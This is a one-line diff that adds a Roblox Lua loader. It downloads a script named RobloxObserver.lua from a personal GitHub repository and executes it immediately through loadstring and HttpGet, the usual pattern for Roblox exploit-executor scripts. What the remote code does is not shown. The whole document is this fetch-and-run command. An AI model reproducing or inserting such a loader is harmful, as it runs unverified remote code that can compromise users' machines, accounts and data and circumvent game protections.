@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SeRh1O4306/RobloxObserve/refs/heads/main/RobloxObserver.lua"))()
